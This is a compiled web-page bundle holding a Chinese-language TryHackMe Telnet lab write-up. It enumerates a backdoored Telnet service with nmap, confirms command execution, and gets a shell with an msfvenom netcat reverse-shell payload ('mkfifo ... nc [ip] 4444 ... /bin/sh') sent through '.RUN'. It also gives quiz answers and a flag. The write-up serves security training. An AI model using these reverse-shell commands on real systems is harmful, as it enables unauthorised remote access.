import{_ as r,c as g,a as t,d as s,b as h,e as a,w as e,r as k,o}from"./app-rzor12pK.js";const c="/assets/file-20241116235324-kxQY3ORZ.png",A={};function y(m,i){const p=k("RouteLink"),d=k("Tabs");return o(),g("div",null,[i[13]||(i[13]=t('<p>Telnet是一种应用程序协议（<code>application protocol</code> ），它允许您使用telnet客户端连接到托管telnet服务器的远程计算机并在其上执行命令。 Telnet 以明文形式发送所有消息，并且没有特定的安全机制。因此，在许多应用程序和服务中，Telnet 在大多数实现中已被 SSH 取代。</p><h2 id="telnet-使用" tabindex="-1"><a class="header-anchor" href="#telnet-使用"><span>Telnet 使用</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">telnet</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> [ip] </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">port</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="hint-container tip"><p class="hint-container-title">提示</p><p><strong>telnet 窗口执行命令，需要在命令执行前添加<code>.RUN</code></strong></p></div><details class="hint-container details"><summary>什么是telnet？</summary><p><strong>答案</strong>： <code>application protocol</code></p></details><details class="hint-container details"><summary>什么慢慢取代了 Telnet？</summary><p><strong>答案</strong>： <code>ssh</code></p></details><details class="hint-container details"><summary>如何连接到端口 23 上 IP 为 10.10.10.3 的 Telnet 服务器？</summary><p><strong>答案</strong>： <code>telnet 10.10.10.3 23</code></p></details><details class="hint-container details"><summary>缺少什么，意味着所有 Telnet 通信都是明文的？</summary><p><em>提示：现代互联网使用什么来安全通信？</em><strong>答案</strong>：<code>encryption</code></p></details><h2 id="telnet枚举-enumerating" tabindex="-1"><a class="header-anchor" href="#telnet枚举-enumerating"><span>Telnet枚举（Enumerating）</span></a></h2><p>我们已经看到了密钥枚举如何利用配置错误的网络服务。然而，可能微不足以利用的漏洞并不总是突然出现在我们面前。因此，尤其是在列举网络服务时，我们需要彻底使用我们的方法。</p>',10)),s("p",null,[i[1]||(i[1]=a("让我们以通常使用的方式开始，即端口扫描，以尽可能多地了解有关目标计算机的服务、应用程序、结构和操作系统的信息。使用")),h(p,{to:"/notes/penetration/1.tryhackme/5.Network_NMAP.html"},{default:e(()=>i[0]||(i[0]=[a("NMAP")])),_:1}),i[2]||(i[2]=a("和标签 ")),i[3]||(i[3]=s("code",null,"-A",-1)),i[4]||(i[4]=a(" 和 ")),i[5]||(i[5]=s("code",null,"-p-",-1)),i[6]||(i[6]=a(" 扫描计算机。"))]),i[14]||(i[14]=t(`<ul><li><code>-A</code>：将操作系统检测、版本检测、脚本扫描和 Traceroute 合二为一（噪声大）。</li><li><code>-p-</code>：启用所有端口的扫描，而不仅仅是前 1000 个端口。</li></ul><details class="hint-container details"><summary>有多少端口在此及其开启？</summary><p><strong>答案</strong>：<code>1</code> 让我们从使用 Nmap 扫描机器开始：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">sudo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> nmap</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -p-</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.86.243</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Starting</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Nmap</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 7.93</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ( </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">https://nmap.org</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ) at 2024-07-22 12:43 UTC</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Nmap</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> scan</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> report</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> for</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ip-10-10-86-243.eu-west-1.compute.internal</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (10.10.86.243)</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Host</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> is</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> up</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (0.00070s </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">latency</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">).</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Not</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> shown:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 65534</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> closed</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> tcp</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ports</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (reset)</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PORT</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     STATE</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> SERVICE</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">8012/tcp</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> open</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  unknown</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">MAC</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Address:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> 02:3C:80:9F:77:B3</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (Unknown)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Nmap</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> done:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> IP</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> address</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (1 </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">host</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> up</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">) scanned in 3.55 seconds</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="hint-container details"><summary>哪个端口是开启的？</summary><p><strong>答案</strong>：<code>8012</code></p></details><details class="hint-container details"><summary>这个端口是未分配的，但任然给出了他正在使用的协议类型，是什么协议？</summary><p><strong>答案</strong>：<code>TCP</code></p></details><details class="hint-container details"><summary>不用<code>-p-</code>参数，扫描结果中有几个端口开启？</summary><p><strong>答案</strong>：<code>0</code></p><p><strong>在这里，我们看到通过将 telnet 分配给非标准端口，它不是 nmap 扫描的公共端口列表或前 1000 个端口的一部分。在列举时尝试每个角度很重要，因为您在此处收集的信息将为您的开发阶段提供信息。</strong></p></details><details class="hint-container details"><summary>根据返回信息，我们认为这个端口可以来干什么？</summary><p><strong>答案</strong>：<code>abackdoor</code></p></details><details class="hint-container details"><summary>它会属于谁？</summary><p><strong>答案</strong>：<code>Skidy</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">sudo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> nmap</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  -sV</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -p8012</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  10.10.86.243</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Starting</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Nmap</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 7.93</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ( </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">https://nmap.org</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ) at 2024-07-22 12:50 UTC</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Nmap</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> scan</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> report</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> for</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ip-10-10-86-243.eu-west-1.compute.internal</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (10.10.86.243)</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Host</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> is</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> up</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (0.00019s </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">latency</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">).</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PORT</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     STATE</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> SERVICE</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> VERSION</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">8012/tcp</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> open</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  unknown</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">1</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> service</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> unrecognized</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> despite</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> returning</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> data.</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> If</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> you</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> know</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> the</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> service/version,</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> please</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> submit</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> the</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> following</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> fingerprint</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> at</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> https://nmap.org/cgi-bin/submit.cgi?new-service</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> :</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">SF-Port8012-TCP:V</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">=7.93%I=7%D=7/22%Time=669E559B%P=x86_64-pc-linux-gnu%r</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">NU</span></span>
<span class="line highlighted"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">SF:LL,2E,</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">&quot;SKIDY&#39;S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20command</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">SF:s\\n&quot;</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">)%r(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">GenericLines,2E,</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">&quot;SKIDY&#39;S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\\</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="telnet-漏洞利用" tabindex="-1"><a class="header-anchor" href="#telnet-漏洞利用"><span>Telnet 漏洞利用</span></a></h2><p>Telnet 作为一种协议，由于我们之前讨论的原因，它本身是不安全的。它缺乏加密，因此所有通信都通过明文发送，并且在大多数情况下访问控制不佳。但是，Telnet 客户端和服务器系统存在 CVE，因此在利用时，您可以在以下位置检查这些 CVE：</p><ul><li><a href="https://www.cvedetails.com/" target="_blank" rel="noopener noreferrer">https://www.cvedetails.com/</a></li><li><a href="https://cve.mitre.org/" target="_blank" rel="noopener noreferrer">https://cve.mitre.org/</a> CVE 是 Common Vulnerabilities and Exposures 的缩写，是公开披露的计算机安全漏洞列表。当有人提到 CVE 时，他们通常是指分配给安全漏洞的 CVE ID 号。 但是，您更有可能发现 telnet 的配置或运行方式存在错误配置，从而允许您利用它。</li></ul><p>因此，从我们的枚举阶段，我们知道：</p><ul><li>此机器上正在运行一个隐藏性很差的 telnet 服务</li><li>“backdoor”服务本身被标记为 “backdoor”</li><li>我们可能牵涉到“Skidy”的用户名 使用此信息，让我们尝试访问此 telnet 端口，并将其用作在机器上获得完整反向 shell 的立足点！</li></ul><h4 id="连接到-telnet" tabindex="-1"><a class="header-anchor" href="#连接到-telnet"><span>连接到 telnet</span></a></h4><p><strong>什么是反向shell？</strong></p><p><img src="`+c+`" alt=""></p><p>“shell” 可以简单地描述为一段代码或程序，可用于在设备上执行代码或命令。 反向 shell 是一种 shell，其中目标机器与攻击机器通信。攻击机器有一个侦听端口，它通过该端口接收连接，从而实现代码或命令的执行。</p><details class="hint-container details"><summary>登陆telnet，我们收到了什么欢迎信息?</summary><p><strong>答案：</strong><code>SKIDY&#39;S BACKDOOR</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">telnet</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.86.243</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8012</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Trying</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> 10.10.86.243...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Connected</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> to</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> 10.10.86.243.</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Escape</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> character</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> is</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">^]</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">.</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">SKIDY</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">&#39;S BACKDOOR. Type .HELP to view commands</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="hint-container details"><summary>尝试运行命令，会有返回信息吗？</summary><p><strong>答案：</strong><code>N</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">.RUN</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ls</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></details><h3 id="验证是否可以执行命令" tabindex="-1"><a class="header-anchor" href="#验证是否可以执行命令"><span>验证是否可以执行命令</span></a></h3><p>嗯......这很奇怪。让我们检查一下我们键入的内容是否作为系统命令执行。</p><details class="hint-container details"><summary>在本地主机上启动tcpdump 侦听器，侦听 <code>ping</code>操作的<code>ICMP</code>流量：<code>sudo tcpdump local-ip proto \\\\icmp -i eth0</code>Telnet 会话中运行“ping [local IP] -c 1” 看看本地是否能够收到<code>ping</code>流量？</summary><p><strong>答案：</strong> <code>Y</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">sudo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> tcpdump</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ip</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> proto</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> \\\\</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">icmp</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -i</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> eth0</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">  # 本地IP</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> .RUN</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ping</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -c</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.33.28</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">   # telnet会话窗口执行命令，记得加\`.RUN\`</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></details><p>太好了！这意味着我们能够执行系统命令，并且能够访问我们的本地计算机。现在让我们来找点乐子吧！</p><h3 id="生成-reverse-shell" tabindex="-1"><a class="header-anchor" href="#生成-reverse-shell"><span>生成 reverse_shell</span></a></h3><p><strong>我们将使用 msfvenom 生成反向 shell 有效负载。这将为我们生成并编码一个 netcat 反向 shell。这是我们的语法：</strong></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msfvenom</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -p</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> cmd/unix/reverse_netcat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> lhost=[local</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> tun0</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ip]</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> lport=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">4444</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> R</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><code>-p</code> = 有效载荷类型</li><li><code>lhost</code> = 我们的本地主机 IP 地址</li><li><code>lport</code> = 要侦听的端口</li><li><code>R</code> = 以原始格式导出有效负载</li></ul><details class="hint-container details"><summary>用<code>msfvenom</code> 生成反向<code>shell</code> 的payload，<code>payload</code>以哪个单词开头 ？</summary><p><strong>答案：</strong><code>mkfifo</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msfvenom</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  -p</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> cmd/unix/reverse_netcat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> lhost=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">10.10.33.28</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  lport=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">4444</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> R</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">-</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">-</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> No arch selected, selecting arch: cmd from the payload</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">No</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> encoder</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> specified,</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> outputting</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> raw</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> payload</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Payload</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> size:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 101</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> bytes</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">mkfifo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> /tmp/mbilfvt</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> nc</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.33.28</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 4444</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 0</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">/tmp/mbilfvt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> /bin/sh</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">/tmp/mbilfvt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> 2&gt;&amp;1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> rm</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> /tmp/mbilfvt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="hint-container details"><summary>成功！flag.txt 的内容是什么？</summary><p><strong>答案：</strong> <code>THM{y0u_g0t_th3_t3ln3t_fl4g}</code></p></details>`,28)),h(d,{id:"206",data:[{id:"本地端口监听"},{id:"远程执行反弹"},{id:"flag"}]},{title0:e(({value:n,isActive:l})=>i[7]||(i[7]=[a("本地端口监听")])),title1:e(({value:n,isActive:l})=>i[8]||(i[8]=[a("远程执行反弹")])),title2:e(({value:n,isActive:l})=>i[9]||(i[9]=[a("flag")])),tab0:e(({value:n,isActive:l})=>i[10]||(i[10]=[s("div",{class:"language-bash line-numbers-mode","data-highlighter":"shiki","data-ext":"bash",style:{"--shiki-light":"#393a34","--shiki-dark":"#dbd7caee","--shiki-light-bg":"#ffffff","--shiki-dark-bg":"#121212"}},[s("pre",{class:"shiki shiki-themes vitesse-light vitesse-dark vp-code"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}},"nc"),s("span",{style:{"--shiki-light":"#A65E2B","--shiki-dark":"#C99076"}}," -lvp"),s("span",{style:{"--shiki-light":"#2F798A","--shiki-dark":"#4C9A91"}}," 4444")])])]),s("div",{class:"line-numbers","aria-hidden":"true",style:{"counter-reset":"line-number 0"}},[s("div",{class:"line-number"})])],-1)])),tab1:e(({value:n,isActive:l})=>i[11]||(i[11]=[s("div",{class:"language-bash line-numbers-mode","data-highlighter":"shiki","data-ext":"bash",style:{"--shiki-light":"#393a34","--shiki-dark":"#dbd7caee","--shiki-light-bg":"#ffffff","--shiki-dark-bg":"#121212"}},[s("pre",{class:"shiki shiki-themes vitesse-light vitesse-dark vp-code"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}},".RUN"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}}," mkfifo"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}}," /tmp/mbilfvt"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},";"),s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}}," nc"),s("span",{style:{"--shiki-light":"#2F798A","--shiki-dark":"#4C9A91"}}," 10.10.33.28"),s("span",{style:{"--shiki-light":"#2F798A","--shiki-dark":"#4C9A91"}}," 4444"),s("span",{style:{"--shiki-light":"#2F798A","--shiki-dark":"#4C9A91"}}," 0"),s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}},"<"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}},"/tmp/mbilfvt"),s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}}," |"),s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}}," /bin/sh"),s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}}," 